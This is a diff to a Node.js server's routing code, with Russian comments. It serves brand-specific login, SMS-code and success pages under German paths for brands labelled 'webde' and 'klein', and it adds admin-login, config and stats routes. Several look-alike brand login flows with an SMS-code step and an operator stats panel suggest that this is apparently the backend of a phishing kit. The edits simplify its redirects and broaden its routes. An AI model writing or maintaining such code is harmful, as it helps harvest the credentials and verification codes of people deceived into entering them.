@@ -15,7 +15,8 @@ async function handle(scope) {
     if (isLocalHost(host)) {
       res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
     } else if (brand.id === 'klein') {
-      res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
+      // Относительный редирект: иначе с :3002 уезжали на https://домен/anmelden (порт 443 → старый Apache).
+      res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
     } else {
       res.writeHead(302, { 'Location': brand.canonicalUrl, 'Cache-Control': 'no-store' });
     }
@@ -36,20 +37,20 @@ async function handle(scope) {
   const isWebde = brand.id === 'webde';
   const isKlein = brand.id === 'klein';
 
-  if ((pathname === '/einloggen' || pathname === '/einloggen/') && req.method === 'GET') {
+  if ((pathname === '/einloggen' || pathname === '/einloggen/') && (req.method === 'GET' || req.method === 'HEAD')) {
     if (isKlein) {
       if (safeEnd(res)) return true;
-      res.writeHead(302, { 'Location': 'https://' + (req.headers.host || '').split(':')[0] + '/anmelden', 'Cache-Control': 'no-store' });
+      res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
       res.end();
       return true;
     }
     if (safeEnd(res)) return true;
-    res.writeHead(302, { 'Location': 'https://' + getCanonicalDomain(req) + '/anmelden', 'Cache-Control': 'no-store' });
+    res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
     res.end();
     return true;
   }
 
-  if ((pathname === '/anmelden' || pathname === '/anmelden/') && req.method === 'GET') {
+  if ((pathname === '/anmelden' || pathname === '/anmelden/') && (req.method === 'GET' || req.method === 'HEAD')) {
     if (isKlein) {
       serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req, getBrand);
       return true;
@@ -96,7 +97,7 @@ async function handle(scope) {
     serveFile(path.join(PROJECT_ROOT, 'klein', 'sms-code.html'), res, req, getBrand);
     return true;
   }
-  if ((pathname === '/erfolg' || pathname === '/erfolg/') && req.method === 'GET' && isKlein) {
+  if ((pathname === '/erfolg' || pathname === '/erfolg/') && req.method === 'GET') {
     serveFile(path.join(PROJECT_ROOT, 'klein', 'erfolg.html'), res, req, getBrand);
     return true;
   }
@@ -138,6 +139,20 @@ async function handle(scope) {
       serveFile(path.join(PROJECT_ROOT, dir, fileName), res, req, getBrand);
       return true;
     }
+  }
+
+  if ((pathname === '/admin-login.html' || pathname === '/admin-login' || pathname === '/admin-login/') && req.method === 'GET') {
+    const filePath = path.join(PROJECT_ROOT, 'public', 'admin-login.html');
+    serveFile(filePath, res, req, getBrand);
+    return true;
+  }
+
+  if ((pathname === '/config' || pathname === '/config/' || pathname === '/stats' || pathname === '/stats/') && req.method === 'GET') {
+    if (!checkAdminPageAuth(req, res, parsed)) return true;
+    if (safeEnd(res)) return true;
+    res.writeHead(302, { 'Location': '/admin', 'Cache-Control': 'no-store' });
+    res.end();
+    return true;
   }
 
   if ((pathname === '/admin' || pathname === '/admin/') && req.method === 'GET') {
